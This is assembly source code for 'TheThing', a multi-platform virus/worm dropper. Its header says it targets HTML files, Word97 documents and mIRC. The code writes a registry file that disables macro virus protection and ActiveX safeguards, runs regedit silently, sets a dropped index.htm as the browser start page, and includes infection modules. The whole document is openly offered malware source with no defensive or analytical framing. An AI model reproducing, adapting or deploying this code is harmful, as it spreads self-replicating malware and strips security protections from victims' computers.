;-----------------------------------------------------------------------
;- Name:     TheThing
;- Author:   CyberShadow//SMF
;- Target:   HTML, W97DOC, mIRC worm
;- Size:     Different
;- Stealth:  Word97 Only
;- Polymorphism: No
;- Encrypted:    No
;- Format:
;   1. HTML        (for HTML files)
;   2. VBA         (for W97DOC)
;   3. ASM         (as dropper)
;   4. mIRC script (for mIRC)
;- Description:
;   1. If started THETHING.COM - check for WINDOWS running, if NO -
;      terminated, if YES - find %COMSPEC% save to disk file R.REG,
;      find %WINDOWS%\regedit.exe and start next line:
;                        %WINDOWS%\regedit.exe -s r.reg
;      It do next:
;       a. Disable MacroVirusProtection for Word and Excel
;       b. Disable ActiveX control for HTML files
;       c. makes file %WINDOWS%\index.htm as start page for  IE
;      Then, write file %WINDOWS%\index.htm as dropper.
;   2. If started HTML file - infect Word.
;   3. If  started  Document_Close  in Word97 - disable Macro Virus
;      Protection.  Infect  NormalTemplate  or/and  ActiveDocument,
;      Find  and,  if  find  success, write ?:\mirc\script.ini that
;           makes DCC ON JOIN thething.com. Next, search in  %PATH%  and
;      %MyDocuments%  for  *.HTM?  files  and infect them. At last,
;      write c:\thething.com, start it and delete it.
;- Ideas: Make COM/EXE infection and Excel infection, Melissa stuff, and
;      Boot/MBR infection :)
;-----------------------------------------------------------------------
.model tiny
.code
.386
    org 100h
start:
        mov ax,cs:[2ch]     ; От find'им откуд  груз нулись
        mov Ds,ax
        xor bx,bx
next:
        mov al,ds:[bx]
        or al,0
        je con
        inc bx
        jmp next
con:
        inc bx
        mov al,ds:[bx]
        or al,al
        jne next
    add bx,3
    xchg bx,dx
    mov ax,3d00h
    int 21h
    jc outta
    xchg bx,ax
    push cs cs
    pop es ds
    mov dx,50000
    mov cx,10000
    mov ah,3fh
    int 21h
    mov ds:[49990],ax
    mov ah,3eh
    int 21h

        mov ax,1683h
        xor bx,bx
        int 2fh                 ;Is windows running?
        test bx,bx
        jz outta
    cld
        mov di,offset comspec   ;Find COMSPEC
    call search
    jc outta
    mov di,offset buffer
    call moving
    push di
        mov di,offset windir    ;Find WinBootDir
    call search
    pop di
    jc outta
    xor al,al
    stosb
    mov cs:[tmp_1],di
    mov eax,20632fffh
    stosd
    call moving
    push cs
    pop ds
    mov si,offset regedit
    call moving
    mov al,0dh
    stosb
    mov di,offset WinDir
    call search
    mov di,offset buffer1
    call moving
    push cs
    pop ds
    mov si,offset htmFileName
    call moving
    sub si,offset htmFileName
    add si,offset reg_dump-offset htmFileName-2
    mov cs:[tmp_2],si
    mov dx,offset file_reg
    xor cx,cx
    mov ah,3ch
    int 21h
    jc outta
    xchg bx,ax
    mov dx,offset reg_dump
    mov ah,40h
    mov cx,offset endRegDump-offset reg_dump
    int 21h
        mov si,offset buffer1
    mov di,60000
    mov cx,cs:[tmp_2]
    push di si cx
    cld
    rep movsb
    pop cx di si
    push di
replaceStuff:
    lodsb
    cmp al,'\'
    jne repS1
    stosb
    inc word ptr cs:[tmp_2]
repS1:
    stosb
    loop replaceStuff
    pop dx
    mov ah,40h
    mov cx,cs:[tmp_2]
    int 21h
    mov dx,offset endRegDump
    mov ah,40h
    mov cx,offset endRegDump1-offset endRegDump
    int 21h
    mov dx,offset buffer1
    mov ah,40h
    mov cx,cs:[tmp_2]
    int 21h
    mov dx,offset endRegDump1
    mov ah,40h
    mov cx,offset endRegDump2-offset endRegDump1
    int 21h
    mov ah,3eh
    int 21h

    push cs cs
    mov ax,4a00h
    mov bx,1000h
    int 21h
    pop es ds
    mov dx,offset buffer
    mov bx,offset block_s
    mov word ptr cs:[bx],0
    mov ax,cs:[tmp_1]
    mov word ptr cs:[bx+2],ax
    mov cs:[bx+4],cs
    cli
    mov cs:tmp_1,ss
    mov cs:tmp_2,sp
    sti
    mov ax,4b00h
    int 21h
    cli
    mov ss,cs:[tmp_1]
    mov sp,cs:[tmp_2]
    sti
    mov dx,offset file_reg
    mov ah,41h
    int 21h             ;delete r.reg
    
    mov di,offset WinDir
    call search
    mov di,offset buffer
    push di
    call moving
    push cs
    pop ds
    mov si,offset htmFileName
    call moving
    pop dx
    xor cx,cx
    mov ah,3ch
    int 21h
    jc outta
    xchg bx,ax
    mov dx,offset inf1
    mov ah,40h
    mov cx,offset endinf1-offset inf1
    int 21h
    mov dx,offset buffer
    call make_dump
    inc cx
    mov ah,40h
    int 21h
    mov dx,offset endinf1
    mov cx,offset endinf2-offset endinf1
    mov ah,40h
    int 21h
    mov ah,3eh
    int 21h
outta:
    mov ah,4ch
    int 21h
make_dump:
    push bx dx
    mov di,dx
    mov si,50000
    mov cx,cs:[49990]
    add cx,si
    mov ax,"''"
    stosw
    xor bl,bl
startDump:
    lodsb
    mov ah,al
    and al,15
    add al,33
    stosb
    shr ax,12
    add al,33
    stosb
    inc bl
    inc bl
    cmp bl,40
    jb nextDump
    xor bl,bl
    mov ax,0a0dh
    stosw
    mov ax,"''"
    stosw
nextDump:
    cmp si,cx
    jb startDump
    mov ax,2020h
    mov es:[di],ax
    sub di,dx
    mov cx,di
    pop dx bx
    ret
moving:
    lodsb
    or al,al
    je no_move
    stosb
    jmp moving
no_move:
    ret
search:
        mov bp,di
        mov ds,cs:[2ch]
        xor si,si
search_0:
    mov di,bp
search_1:
    cmp word ptr ds:[si],0
    je not_found
    lodsb
    and al,11011111b
    cmp al,cs:[di]
    jne search_0
search_2:
    inc di
    cmp byte ptr cs:[di],0
        jne search_1
search_3:
    lodsb
    cmp al,':'
    jne search_3
    dec si
    dec si
    clc
        ret
not_found:
    stc
    ret
windir  db 'WINBOOTDIR',0
comspec db 'COMSPEC',0
regedit db '\REGEDIT.EXE -s '
file_reg db 'r.reg',0
htmFileName db '\index.htm',0 ;Label 'reg_dump' must stay after 'htmFileName'
reg_dump:
db 'REGEDIT4',0dh,0ah
db 0dh,0ah
db '[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]',0dh,0ah
db '"Options6"=""',0dh,0ah
db '[HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]',0dh,0ah
db '"Options6"=""',0dh,0ah
db '[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]',0dh,0ah
db '"EnableMacroVirusProtection"="0"',0dh,0ah
db '[HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\Word\Options]',0dh,0ah
db '"EnableMacroVirusProtection"="0"',0dh,0ah
db '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0]',0dh,0ah
db '"1201" = ""',0dh,0ah
db '[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0]',0dh,0ah
db '"1201" = ""',0dh,0ah
db '[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]',0dh,0ah
db '"Start Page"="'
endRegDump:
db '"',0dh,0ah
db '[HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main]',0dh,0ah
db '"Start Page"="'
endRegDump1:
db '"',0dh,0ah
endRegDump2:
inf1:
include inf1.asm
endinf1:
include inf2.asm
endinf2:
;WARNING!!!!! After endinf2 only non needed variables!!!!!!!
tmp_1   dw ?
tmp_2   dw ?
block_s dw ?,?,?
buffer1 db 256 dup (?)
buffer:
end start
